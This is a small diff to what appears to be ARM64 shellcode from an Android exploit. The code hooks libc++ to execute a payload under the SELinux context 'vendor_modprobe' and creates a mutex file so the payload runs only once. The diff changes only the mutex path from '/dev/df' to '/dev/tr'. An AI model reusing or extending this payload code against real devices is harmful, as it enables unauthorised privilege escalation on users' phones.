@@ -12,7 +12,7 @@
 libcxx_data:
 
 mutex_file:
-    .asciz "/dev/df"
+    .asciz "/dev/tr"
 selinux_ctx:
     .asciz "u:r:vendor_modprobe:s0"
 selinux_ctx_end:
@@ -53,7 +53,7 @@ libcxx_start:
     bne     return
 
     // To avoid later call of hook to execute payload, create file as mutex.
-    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
+    // Mutex: openat(AT_FDCWD, "/dev/tr", O_CREAT|O_EXCL|O_CLOEXEC, 0)
     mov     x0, -100
     adr     x1, mutex_file
     movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
